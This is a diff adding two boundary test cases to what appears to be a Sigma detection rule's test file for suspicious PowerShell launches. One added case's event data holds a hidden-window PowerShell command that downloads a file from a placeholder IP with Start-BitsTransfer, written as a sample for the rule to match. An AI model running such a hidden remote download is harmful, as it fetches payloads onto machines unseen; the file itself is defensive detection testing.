@@ -36,6 +36,25 @@ cases:
       ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\winword.exe'
       User: 'CONTOSO\jdoe'
 
+  # The two-signal threshold is expressed as six explicit pairs because pySigma
+  # does not implement `N of` for N greater than one. These cases pin the boundary
+  # so a future edit to that expansion cannot quietly change it.
+  - name: Exactly two signals, ordinary parent, no defence tampering
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell.exe -WindowStyle Hidden Start-BitsTransfer -Source http://198.51.100.23/b.dat"
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Exactly one signal, ordinary parent, no defence tampering
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -WindowStyle Hidden Get-ChildItem C:\Temp'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
   - name: Interactive administrative one-liner
     expect: no_match
     event:
